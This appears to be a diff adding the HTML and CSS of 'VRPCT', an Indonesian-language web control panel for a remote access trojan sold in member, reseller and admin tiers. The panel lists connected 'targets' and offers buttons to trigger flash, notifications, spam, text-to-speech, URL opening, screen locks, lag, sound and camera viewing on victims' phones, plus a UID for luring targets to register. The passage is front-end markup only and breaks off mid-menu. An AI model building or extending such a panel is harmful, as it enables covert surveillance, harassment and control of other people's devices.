+            justify-content: center;
+            gap: 6px
+        }
+        .device-info-item .label i {
+            font-size: 1rem
+        }
+        .device-info-item .value {
+            color: #fff;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-top: 4px
+        }
+        .device-info-item .value.online {
+            color: #00ffcc
+        }
+        .device-info-item .value.offline {
+            color: #ff6666
+        }
+        .modal-delete-step {
+            display: none
+        }
+        .modal-delete-step.active {
+            display: block
+        }
+        .modal-delete-step .desc {
+            color: #aaa;
+            margin: 12px 0
+        }
+        .modal-delete-step .btn-group {
+            display: flex;
+            gap: 14px;
+            margin-top: 16px
+        }
+        .modal-delete-step .btn-group .btn-confirm {
+            flex: 1;
+            padding: 14px;
+            border-radius: 40px;
+            border: none;
+            font-weight: 800;
+            cursor: pointer;
+            font-size: 16px;
+            transition: .2s;
+            letter-spacing: 1px
+        }
+        .modal-delete-step .btn-confirm.yes {
+            background: linear-gradient(95deg, #00ffcc, #0099aa);
+            color: #000
+        }
+        .modal-delete-step .btn-confirm.yes:hover {
+            transform: scale(1.03)
+        }
+        .modal-delete-step .btn-confirm.no {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2)
+        }
+        .modal-delete-step .btn-confirm.no:hover {
+            background: rgba(255, 255, 255, 0.2)
+        }
+        .modal-delete-step .btn-confirm.yes.btn-danger {
+            background: linear-gradient(95deg, #ff3333, #cc0000);
+            color: #fff
+        }
+        .rat-badge .fa-circle {
+            display: none
+        }
+        .rat-badge {
+            background: transparent;
+            border: none;
+            color: #00ffcc;
+            font-size: 14px;
+            padding: 0
+        }
+        .rat-target-box .rat-target-label {
+            display: none
+        }
+        .file-list,
+        .gallery-list,
+        .notif-list {
+            width: 100%;
+            max-width: 600px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px
+        }
+        .file-item .icon {
+            margin-right: 12px;
+            font-size: 1.2rem
+        }
+        .gallery-item {
+            display: flex;
+            align-items: center;
+            gap: 12px
+        }
+        .gallery-item .thumb {
+            width: 60px;
+            height: 60px;
+            border-radius: 8px;
+            object-fit: cover;
+            background: #222
+        }
+        .gallery-item .info {
+            flex: 1
+        }
+        .gallery-item .info .fname {
+            font-weight: bold;
+            color: #fff
+        }
+        .gallery-item .info .fsize {
+            color: #888;
+            font-size: .7rem
+        }
+        .notif-item {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 12px 16px;
+            width: 100%;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            gap: 12px
+        }
+        .notif-item .icon {
+            font-size: 1.4rem
+        }
+        .notif-item .text {
+            flex: 1
+        }
+        .notif-item .time {
+            color: #888;
+            font-size: .7rem
+        }
+        .room-content .no-targets {
+            text-align: center;
+            width: 100%
+        }
+        .room-content .data-display {
+            width: 100%
+        }
+        .room-content #mapContainer {
+            margin: 0 auto
+        }
+        .room-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 14px 18px;
+            margin-bottom: 12px;
+            transition: .2s;
+            width: 100%;
+            max-width: 600px
+        }
+        .room-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: #00ffcc
+        }
+        .room-item .room-icon {
+            font-size: 1.8rem;
+            color: #00ffcc;
+            flex-shrink: 0;
+            width: 40px;
+            text-align: center
+        }
+        .room-item .room-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            min-width: 0
+        }
+        .room-item .room-info .primary {
+            color: #fff;
+            font-weight: 700;
+            font-size: .95rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+        .room-item .room-info .secondary {
+            color: #aaa;
+            font-size: .8rem;
+            word-break: break-word
+        }
+        .room-item .room-info .time {
+            color: #666;
+            font-size: .7rem;
+            margin-top: 2px
+        }
+        .room-item .copy-btn {
+            background: rgba(0, 255, 204, 0.15);
+            border: 1px solid #00ffcc;
+            border-radius: 30px;
+            padding: 6px 14px;
+            color: #00ffcc;
+            font-size: .75rem;
+            cursor: pointer;
+            transition: .2s;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0
+        }
+        .room-item .copy-btn:hover {
+            background: rgba(0, 255, 204, 0.3);
+            transform: scale(1.02)
+        }
+        .room-item .file-icon {
+            font-size: 2rem;
+            flex-shrink: 0;
+            width: 40px;
+            text-align: center
+        }
+        .room-item .file-icon.folder {
+            color: #ffcc00
+        }
+        .room-item .file-icon.file {
+            color: #66bbff
+        }
+        .room-item .file-icon.image {
+            color: #ffaa00
+        }
+        .room-item .file-icon.video {
+            color: #ff6b6b
+        }
+        .camera-btn-large {
+            background: linear-gradient(95deg, #00ffcc, #0099aa);
+            border: none;
+            border-radius: 30px;
+            color: #000;
+            font-weight: 800;
+            cursor: pointer;
+            padding: 16px 36px;
+            font-size: 1.2rem;
+            min-width: 140px;
+            transition: .2s;
+            letter-spacing: .5px
+        }
+        .camera-btn-large:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.3)
+        }
+        .camera-btn-large:active {
+            transform: scale(0.97)
+        }
+        @keyframes textGlow {
+            0% {
+                opacity: .6;
+                letter-spacing: 4px
+            }
+            100% {
+                opacity: 1;
+                letter-spacing: 8px
+            }
+        }
+        .video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            object-fit: cover;
+            opacity: 0.35
+        }
+        .screen-view {
+            position: relative;
+            z-index: 1
+        }
+        .screen-view .video-bg {
+            display: block
+        }
+        .screen-view:not(.naga-bg-active) .video-bg {
+            display: none
+        }
+        .modal-admin .btn-group {
+            display: flex;
+            gap: 16px;
+            margin-top: 20px
+        }
+        .modal-admin .btn-group .btn-confirm {
+            flex: 1;
+            padding: 18px 20px;
+            font-size: 18px;
+            font-weight: 800;
+            border-radius: 40px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+            min-width: 100px;
+            text-align: center
+        }
+        .modal-admin .btn-group .btn-confirm.yes {
+            background: linear-gradient(95deg, #00ffcc, #0099aa);
+            color: #000
+        }
+        .modal-admin .btn-group .btn-confirm.yes:hover {
+            transform: scale(1.03)
+        }
+        .modal-admin .btn-group .btn-confirm.yes.btn-danger {
+            background: linear-gradient(95deg, #ff3333, #cc0000);
+            color: #fff
+        }
+        .modal-admin .btn-group .btn-confirm.no {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1.5px solid rgba(255, 255, 255, 0.2)
+        }
+        .modal-admin .btn-group .btn-confirm.no:hover {
+            background: rgba(255, 255, 255, 0.2)
+        }
+        .modal-admin .rat-modal-card {
+            max-width: 400px
+        }
+        .modal-admin .rat-menu-title {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 1.5px
+        }
+        .modal-admin .desc {
+            font-size: 16px;
+            color: #aaa;
+            margin: 14px 0 18px;
+            line-height: 1.6
+        }
+        /* ===== CHAT GLOBAL STYLE ===== */
+        .chat-container {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            height: 70vh;
+            gap: 12px;
+        }
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            border-radius: 16px;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            min-height: 200px;
+        }
+        .chat-messages::-webkit-scrollbar {
+            width: 6px;
+        }
+        .chat-messages::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 204, 0.3);
+            border-radius: 10px;
+        }
+        .chat-msg {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 8px 14px;
+            border-left: 3px solid #00ffcc;
+            word-break: break-word;
+            animation: fadeIn 0.3s ease;
+        }
+        .chat-msg .msg-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: .75rem;
+            color: #8aaee0;
+            margin-bottom: 4px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .chat-msg .msg-header .username {
+            font-weight: bold;
+            color: #fff;
+        }
+        .chat-msg .msg-header .role {
+            font-weight: bold;
+            padding: 0 8px;
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.4);
+            font-size: .65rem;
+            letter-spacing: .5px;
+        }
+        .chat-msg .msg-header .time {
+            color: #666;
+            font-size: .65rem;
+        }
+        .chat-msg .msg-body {
+            color: #e4e4f0;
+            font-size: .95rem;
+            line-height: 1.4;
+        }
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            border-radius: 30px;
+            padding: 4px 4px 4px 16px;
+            align-items: center;
+        }
+        .chat-input-area input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 1rem;
+            padding: 12px 0;
+            outline: none;
+            min-width: 0;
+        }
+        .chat-input-area input::placeholder {
+            color: #666;
+        }
+        .chat-input-area button {
+            background: linear-gradient(95deg, #00ffcc, #0099aa);
+            border: none;
+            border-radius: 30px;
+            padding: 10px 20px;
+            color: #000;
+            font-weight: 800;
+            cursor: pointer;
+            font-size: .9rem;
+            transition: .2s;
+            white-space: nowrap;
+        }
+        .chat-input-area button:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.3);
+        }
+        .chat-input-area button:active {
+            transform: scale(0.97);
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(8px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        .role-MEMBER { border-left-color: #00ffcc; }
+        .role-RESELLER { border-left-color: #ffaa33; }
+        .role-ADMIN { border-left-color: #ff3366; }
+        .role-BOSS { border-left-color: #ff0000; }
+        .role-MEMBER .role { color: #00ffcc; }
+        .role-RESELLER .role { color: #ffaa33; }
+        .role-ADMIN .role { color: #ff3366; }
+        .role-BOSS .role { color: #ff0000; }
+
+        /* ===== TOGGLE SWITCH (baru) ===== */
+        .switch-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 12px 0;
+            color: #fff;
+            font-size: 0.9rem;
+        }
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #555;
+            transition: .3s;
+            border-radius: 34px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+        .switch input:checked + .slider {
+            background-color: #00ffcc;
+        }
+        .switch input:checked + .slider:before {
+            transform: translateX(22px);
+        }
+
+        /* ===== PASSWORD TOGGLE ===== */
+        .password-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .password-wrapper input {
+            flex: 1;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            color: #aaa;
+            cursor: pointer;
+            font-size: 1.3rem;
+            background: transparent;
+            border: none;
+            outline: none;
+        }
+        .password-toggle:hover {
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <!-- ===== TOAST & LOADING ===== -->
+    <div id="toastNotification" class="status-toast">Notifikasi</div>
+    <div id="loadingOverlay" class="loading-overlay">
+        <button class="btn-skip-loading" onclick="skipLoading()">Skip Intro</button>
+        <div class="video-emblem">
+            <video autoplay muted loop playsinline>
+                <source src="https://rullzvesga.github.io/pos/vvv.mp4" type="video/mp4">
+            </video>
+        </div>
+        <div class="loading-text-main">VRPCT</div>
+        <div class="loading-sub">Hanya untuk Bersenang-senang</div>
+    </div>
+    <!-- ===== DRAWER ===== -->
+    <div id="drawer" class="drawer">
+        <button class="close-drawer" onclick="toggleDrawer()"><i class="fas fa-times"></i></button>
+        <div class="drawer-header">
+            <div class="drawer-video">
+                <video autoplay muted loop playsinline>
+                    <source src="https://rullzvesga.github.io/pos/naa.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="drawer-title">VRPCT</div>
+            <div class="drawer-sub">Versi 6.0.0</div>
+        </div>
+        <div class="drawer-content">
+            <div class="drawer-section">
+                <h4><i class="fas fa-user-secret"></i> Tentang Developer</h4>
+                <div class="drawer-text">Developer : <strong style="color:#00ffcc">Rullz</strong></div>
+                <div class="drawer-text" id="drawerUserRole">Status role : <strong style="color:#ffaa33">-</strong></div>
+                <div class="drawer-text"><i class="fas fa-heart" style="color:#ff3366"></i> THANK YOU SUPPORT MY <i class="fas fa-heart" style="color:#ff3366"></i></div>
+            </div>
+            <div class="drawer-section">
+                <h4><i class="fas fa-exclamation-triangle"></i> Peringatan</h4>
+                <div class="drawer-text">⚠️ Jangan kasih akun anda ke siapapun</div>
+                <div class="drawer-text">⚠️ jika ada bug hubugin admin</div>
+                <div class="drawer-text">⚠️ Jangan sadap orang yang tidak bersalah</div>
+                <div class="drawer-text warning-text">⚠️ Semua resiko ditanggung user</div>
+            </div>
+            <div class="drawer-section">
+                <h4><i class="fas fa-link"></i> Saluran & Sosial</h4>
+                <div style="display:flex;flex-direction:column;gap:8px;margin-top:10px">
+                    <div onclick="openLink('https://whatsapp.com/channel/0029VbBQG9p6xCSYJZRhdx0l')" style="background:rgba(37,211,102,0.15);border:1px solid #25D366;border-radius:12px;padding:12px 16px;cursor:pointer;display:flex;align-items:center;gap:12px;transition:.2s">
+                        <i class="fab fa-whatsapp" style="color:#25D366;font-size:1.4rem"></i>
+                        <span style="color:#fff;font-size:.9rem;font-weight:600">Saluran 1</span>
+                        <span style="margin-left:auto;color:#25D366;font-size:.7rem"><i class="fas fa-arrow-right"></i></span>
+                    </div>
+                    <div onclick="openLink('https://tiktok.com/@rurulxware')" style="background:rgba(0,0,0,0.3);border:1px solid #25F4EE;border-radius:12px;padding:12px 16px;cursor:pointer;display:flex;align-items:center;gap:12px;transition:.2s">
+                        <i class="fab fa-tiktok" style="color:#25F4EE;font-size:1.4rem"></i>
+                        <span style="color:#fff;font-size:.9rem;font-weight:600">TikTok 1</span>
+                        <span style="margin-left:auto;color:#25F4EE;font-size:.7rem"><i class="fas fa-arrow-right"></i></span>
+                    </div>
+                </div>
+            </div>
+            <div class="drawer-logout" style="margin-top:20px;background:rgba(255,51,102,0.2);border:1px solid #ff3366;border-radius:40px;text-align:center;padding:12px;cursor:pointer" onclick="logout()"><i class="fas fa-sign-out-alt"></i> LOGOUT</div>
+        </div>
+    </div>
+    <div class="global-hamburger" onclick="toggleDrawer()"><i class="fas fa-bars"></i></div>
+    <!-- ===== LOGIN ===== -->
+    <div id="screenLogin" class="screen-view active naga-bg-active">
+        <video class="video-bg" autoplay muted loop playsinline>
+            <source src="https://rullzvesga.github.io/pos/xxx.mp4" type="video/mp4">
+        </video>
+        <div style="width:100%;max-width:500px;margin:0 auto">
+            <div class="banner-img-wrapper"><div style="width:100%;height:220px;background:linear-gradient(45deg,#1f1c2c,#928dab);display:flex;justify-content:center;align-items:center"><span style="font-size:1.8rem;font-weight:900;color:#ff3366">VRPCT</span></div></div>
+            <div class="sub-brand">Developer By : @Rullz XXXCV</div>
+            <div class="login-input-container">
+                <input type="text" id="usernameField" class="input-box" placeholder="Username">
+                <div class="password-wrapper">
+                    <input type="password" id="passwordField" class="input-box" placeholder="Password" style="padding-right: 60px;">
+                    <button type="button" class="password-toggle" id="passwordToggle"><i class="fas fa-eye"></i></button>
+                </div>
+                <div class="checkbox-container"><input type="checkbox" id="saveLoginCheckbox"> <label for="saveLoginCheckbox">Save username & password</label></div>
+                <button class="btn-submit" id="loginBtn">LOGIN TO VRPCT</button>
+                <div style="text-align:center;margin-top:12px;font-size:.9rem;color:#888">Belum punya akun? <a href="https://tiktok.com/@rurulxware" target="_blank" style="color:#00ffcc;font-weight:bold;text-decoration:none;border-bottom:1px solid #00ffcc;padding-bottom:2px;transition:.2s">Buy</a></div>
+            </div>
+        </div>
+    </div>
+    <!-- ===== HUB ===== -->
+    <div id="screenHub" class="screen-view naga-bg-active">
+        <video class="video-bg" autoplay muted loop playsinline>
+            <source src="https://rullzvesga.github.io/pos/xxx.mp4" type="video/mp4">
+        </video>
+        <div class="banner-img-wrapper" style="max-width:500px;margin:0 auto 20px"><div style="width:100%;height:120px;background:#111;display:flex;justify-content:center;align-items:center"><span style="font-size:1.5rem;font-weight:800">WELCOME TO VRPCT</span></div></div>
+        <div class="sholat-container">
+            <div class="sholat-item"><span class="sholat-name">SHUBUH</span><span class="sholat-time">04:30</span></div>
+            <div class="sholat-item"><span class="sholat-name">DZUHUR</span><span class="sholat-time">12:08</span></div>
+            <div class="sholat-item"><span class="sholat-name">ASHAR</span><span class="sholat-time">15:30</span></div>
+            <div class="sholat-item"><span class="sholat-name">MAGRIB</span><span class="sholat-time">18:15</span></div>
+            <div class="sholat-item"><span class="sholat-name">ISYA</span><span class="sholat-time">19:25</span></div>
+        </div>
+        <div class="sholat-status-live" id="liveSholatStatusText"></div>
+        <div class="quran-section-title">LIST AL - QUR'AN</div>
+        <div class="quran-horizontal-scroll">
+            <div class="quran-card-item" onclick="openSurahView('fatihah')"><div class="quran-card-name">AL - Fatihah</div><div class="quran-card-sub">7 Ayat</div></div>
+            <div class="quran-card-item" onclick="openSurahView('falaq')"><div class="quran-card-name">AL - Falaq</div><div class="quran-card-sub">5 Ayat</div></div>
+            <div class="quran-card-item" onclick="openSurahView('nas')"><div class="quran-card-name">AN - Nass</div><div class="quran-card-sub">6 Ayat</div></div>
+            <div class="quran-card-item" onclick="openSurahView('dhuha')"><div class="quran-card-name">AD - DHUHA</div><div class="quran-card-sub">11 Ayat</div></div>
+            <div class="quran-card-item" onclick="openSurahView('ikhlas')"><div class="quran-card-name">AL - IKHLAS</div><div class="quran-card-sub">4 Ayat</div></div>
+            <div class="quran-card-item" onclick="openSurahView('kursi')"><div class="quran-card-name">AYAT KURSI</div><div class="quran-card-sub">1 Ayat</div></div>
+        </div>
+        <div style="max-width:500px;margin:10px auto 12px;padding:14px 18px;background:rgba(0,255,204,0.06);border:2px solid rgba(0,255,204,0.25);border-radius:20px;display:flex;flex-direction:column;gap:10px">
+            <div style="font-size:.75rem;color:#8aaee0;letter-spacing:1.5px;text-transform:uppercase"><i class="fas fa-qrcode"></i> GENERATE UID</div>
+            <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
+                <input type="text" id="uidInput" style="flex:1;min-width:120px;background:rgba(0,0,0,0.6);border:2px solid rgba(0,255,204,0.4);border-radius:30px;padding:12px 18px;color:#00ffcc;font-size:1.2rem;font-weight:bold;text-align:center;outline:none;min-height:48px;letter-spacing:2px" readonly placeholder="Klik Generate" value="">
+                <button class="uid-btn" id="uidGenerateBtn" onclick="generateUID()" style="background:rgba(0,255,204,0.15);border:1px solid #00ffcc;border-radius:30px;padding:10px 18px;color:#00ffcc;font-weight:700;cursor:pointer;font-size:.85rem;display:flex;align-items:center;gap:6px;transition:.2s;white-space:nowrap"><i class="fas fa-sync"></i> Generate</button>
+                <button class="uid-btn" id="uidCopyBtn" onclick="copyGeneratedUID()" style="background:rgba(0,255,204,0.15);border:1px solid #00ffcc;border-radius:30px;padding:10px 18px;color:#00ffcc;font-weight:700;cursor:pointer;font-size:.85rem;display:flex;align-items:center;gap:6px;transition:.2s;white-space:nowrap"><i class="fas fa-copy"></i> Salin</button>
+            </div>
+            <div style="font-size:.7rem;color:#888;text-align:center;border-top:1px solid rgba(255,255,255,0.05);padding-top:8px">Salin UID dan berikan ke target untuk registrasi</div>
+        </div>
+        <div class="hub-wrapper">
+            <div class="hub-scroll-row">
+                <!-- RAT CONTROL -->
+                <div class="hub-card" onclick="switchView('screenHub','screenRAT')" style="border-color:#00ffcc;">
+                    <i class="fas fa-robot" style="color:#00ffcc;"></i>
+                    <div class="hub-card-title" style="color:#fff;">RAT CONTROL</div>
+                    <div class="hub-card-desc">Remote Access Trojan</div>
+                </div>
+                <!-- CHAT GLOBAL -->
+                <div class="hub-card" onclick="openChatGlobal()" style="border-color:#ffaa33;">
+                    <i class="fas fa-globe" style="color:#ffaa33;"></i>
+                    <div class="hub-card-title" style="color:#fff;">CHAT GLOBAL</div>
+                    <div class="hub-card-desc">Obrolan publik</div>
+                </div>
+            </div>
+            <a href="#" class="notice-admin-text"></a>
+        </div>
+    </div>
+    <!-- ===== SURAH READER ===== -->
+    <div id="screenSurahReader" class="screen-view">
+        <button class="btn-back" onclick="goBackWithScroll('screenSurahReader','screenHub')"><i class="fas fa-arrow-left"></i> Kembali</button>
+        <div class="surah-header-info"><div class="surah-header-title" id="surahTitleName"></div><div class="surah-header-translate" id="surahTitleTranslate"></div></div>
+        <div class="ayat-list-box" id="ayatRenderBox"></div>
+    </div>
+
+    <!-- ===== CHAT GLOBAL SCREEN ===== -->
+    <div id="screenChatGlobal" class="screen-view naga-bg-active">
+        <video class="video-bg" autoplay muted loop playsinline>
+            <source src="https://rullzvesga.github.io/pos/xxx.mp4" type="video/mp4">
+        </video>
+        <button class="btn-back" onclick="switchView('screenChatGlobal','screenHub')"><i class="fas fa-arrow-left"></i> Kembali</button>
+        <div style="text-align:center;margin-bottom:8px;">
+            <span style="font-size:1.5rem;font-weight:800;color:#ffaa33;">🌐 CHAT GLOBAL</span>
+            <div style="font-size:.8rem;color:#8aaee0;margin-top:4px;">Semua pengguna VRPCT</div>
+        </div>
+        <div class="chat-container">
+            <div class="chat-messages" id="chatMessages"></div>
+            <div class="chat-input-area">
+                <input type="text" id="chatInput" placeholder="Ketik pesan..." maxlength="500">
+                <button onclick="sendChatMessage()"><i class="fas fa-paper-plane"></i> Kirim</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== CONFIRM DIALOG ===== -->
+    <div id="confirmDialog" class="confirm-dialog">
+        <div class="confirm-box">
+            <span class="icon" id="confirmIcon">fas fa-camera</span>
+            <div class="title" id="confirmTitle">Apakah Anda yakin?</div>
+            <div class="desc" id="confirmDesc">Ingin melihat camera depan target?</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes" id="confirmYes">Iya</button>
+                <button class="btn-confirm no" id="confirmNo">Batal</button>
+            </div>
+        </div>
+    </div>
+    <!-- ===== RAT CONTROL ===== -->
+    <div id="screenRAT" class="screen-view naga-bg-active">
+        <video class="video-bg" autoplay muted loop playsinline>
+            <source src="https://rullzvesga.github.io/pos/xxx.mp4" type="video/mp4">
+        </video>
+        <div class="rat-wrapper">
+            <div class="rat-container">
+                <div class="rat-header">
+                    <div id="ratBackBtn" class="rat-back-btn" onclick="ratBackHandler()"><i class="fas fa-arrow-left"></i></div>
+                    <div class="rat-logo" id="mainLogo">RAT CONTROL</div>
+                    <div class="rat-badge" id="targetBadge"><span id="badgeText">CONNECT DEVICE</span></div>
+                </div>
+                <div id="ratRoomList" class="rat-control-room active">
+                    <div class="filter-tabs" id="filterTabs">
+                        <div class="filter-tab active" data-filter="all" onclick="setFilter('all')">Semua <span class="badge" id="countAll">0</span></div>
+                        <div class="filter-tab" data-filter="online" onclick="setFilter('online')">Online <span class="badge" id="countOnline">0</span></div>
+                        <div class="filter-tab" data-filter="offline" onclick="setFilter('offline')">Offline <span class="badge" id="countOffline">0</span></div>
+                    </div>
+                    <div class="target-list-container" id="targetListContainer"><div class="no-targets">Belum ada target terhubung</div></div>
+                </div>
+                <div id="ratRoomControl" class="rat-control-room">
+                    <div class="rat-target-box">
+                        <div class="my-id-display">MY ID: <span id="myIdDisplay">-</span></div>
+                        <div style="display:flex;align-items:center;gap:8px;background:rgba(0,0,0,0.45);border:2px solid rgba(0,255,200,0.4);border-radius:35px;padding:4px 4px 4px 18px">
+                            <input type="text" id="ratTargetId" class="rat-target-input" style="border:none;background:transparent;padding:14px 0;flex:1;text-align:left;font-size:16px" placeholder="Pilih target dari daftar" readonly>
+                        </div>
+                    </div>
+                    <div class="rat-menu-grid">
+                        <!-- MEMBER -->
+                        <div class="role-separator member">---- ROLE MEMBER ----</div>
+                        <!-- Flash On -->
+                        <div class="rat-menu-card" data-role="MEMBER" data-action="ratSenterOn">
+                            <div class="rat-menu-icon icon-flash"><i class="fas fa-lightbulb"></i></div>
+                            <div class="rat-menu-title">Flash On</div>
+                        </div>
+                        <!-- Flash Off -->
+                        <div class="rat-menu-card" data-role="MEMBER" data-action="ratSenterOff">
+                            <div class="rat-menu-icon icon-flash"><i class="fas fa-lightbulb"></i></div>
+                            <div class="rat-menu-title">Flash Off</div>
+                        </div>
+                        <!-- Flash Blink -->
+                        <div class="rat-menu-card" data-role="MEMBER" data-action="ratSenterBlink">
+                            <div class="rat-menu-icon icon-flash" style="color:#ffaa33"><i class="fas fa-bolt"></i></div>
+                            <div class="rat-menu-title">Flash Blink</div>
+                        </div>
+                        <!-- Stop Blink -->
+                        <div class="rat-menu-card" data-role="MEMBER" data-action="ratSendStopFlashBlink">
+                            <div class="rat-menu-icon icon-flash" style="color:#ff6666"><i class="fas fa-stop-circle"></i></div>
+                            <div class="rat-menu-title">Stop Flash Blink</div>
+                        </div>
+                        <!-- Toast -->
+                        <div class="rat-menu-card" data-role="MEMBER" data-action="ratShowToast">
+                            <div class="rat-menu-icon icon-toast"><i class="fas fa-comment-dots"></i></div>
+                            <div class="rat-menu-title">Toast</div>
+                        </div>
+
+                        <!-- RESELLER -->
+                        <div class="role-separator reseller">---- ROLE RESELLER ----</div>
+                        <!-- TTS -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="showTtsDialog">
+                            <div class="rat-menu-icon" style="color:#66ccff"><i class="fas fa-volume-up"></i></div>
+                            <div class="rat-menu-title">Text To Speech</div>
+                        </div>
+                        <!-- Open URL -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="showOpenUrlDialog">
+                            <div class="rat-menu-icon icon-url"><i class="fas fa-external-link-alt"></i></div>
+                            <div class="rat-menu-title">Open URL</div>
+                        </div>
+                        <!-- UI LAG -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="sendUILag">
+                            <div class="rat-menu-icon" style="color:#ffaa33"><i class="fas fa-pause-circle"></i></div>
+                            <div class="rat-menu-title">UI LAG</div>
+                        </div>
+                        <!-- Unlock LAG -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="sendUnlockUILag">
+                            <div class="rat-menu-icon" style="color:#00ffcc"><i class="fas fa-play-circle"></i></div>
+                            <div class="rat-menu-title">Unlock LAG</div>
+                        </div>
+                        <!-- Spam Notif -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="showSpamNotifDialog">
+                            <div class="rat-menu-icon" style="color:#ff8800"><i class="fas fa-bell"></i></div>
+                            <div class="rat-menu-title">Spam Notif</div>
+                        </div>
+                        <!-- Lag Combo -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="sendLagCombo">
+                            <div class="rat-menu-icon icon-combo"><i class="fas fa-sync-alt fa-spin"></i></div>
+                            <div class="rat-menu-title">Lag Combo</div>
+                        </div>
+                        <!-- UnLag Combo -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="sendUnlagCombo">
+                            <div class="rat-menu-icon icon-uncombo"><i class="fas fa-sync-alt"></i></div>
+                            <div class="rat-menu-title">UnLag Combo</div>
+                        </div>
+                        <!-- LOCK HTML -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="showLockHtmlDialog">
+                            <div class="rat-menu-icon" style="color:#ffaa33"><i class="fas fa-lock"></i></div>
+                            <div class="rat-menu-title">LOCK HTML</div>
+                        </div>
+                        <!-- UNLOCK -->
+                        <div class="rat-menu-card" data-role="RESELLER" data-action="sendUnlockAll">
+                            <div class="rat-menu-icon" style="color:#00ffcc"><i class="fas fa-unlock"></i></div>
+                            <div class="rat-menu-title">UNLOCK</div>
+                        </div>
+
+                        <!-- ADMIN -->
+                        <div class="role-separator admin">---- ROLE ADMIN ----</div>
+                        <!-- Play Sound -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="sendPlaySoundDirect">
+                            <div class="rat-menu-icon icon-music"><i class="fas fa-music"></i></div>
+                            <div class="rat-menu-title">Play Sound</div>
+                        </div>
+                        <!-- Stop Sound -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="sendStopSound">
+                            <div class="rat-menu-icon icon-music" style="color:#ff6b81"><i class="fas fa-stop-circle"></i></div>
+                            <div class="rat-menu-title">Stop Sound</div>
+                        </div>
+                        <!-- Play Sound Sacred -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="sendPlaySoundSacredDirect">
+                            <div class="rat-menu-icon icon-music"><i class="fas fa-music"></i></div>
+                            <div class="rat-menu-title">Play Sound Sacred</div>
+                        </div>
+                        <!-- Stop Sound Sacred -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="sendStopSoundSacred">
+                            <div class="rat-menu-icon icon-music" style="color:#ff6b81"><i class="fas fa-stop-circle"></i></div>
+                            <div class="rat-menu-title">Stop Sound Sacred</div>
+                        </div>
+                        <!-- Set Volume -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="showSetVolumeDialog">
+                            <div class="rat-menu-icon icon-volume"><i class="fas fa-volume-up"></i></div>
+                            <div class="rat-menu-title">Set Volume</div>
+                        </div>
+                        <!-- Set Brightness -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="showSetBrightnessDialog">
+                            <div class="rat-menu-icon icon-brightness"><i class="fas fa-sun"></i></div>
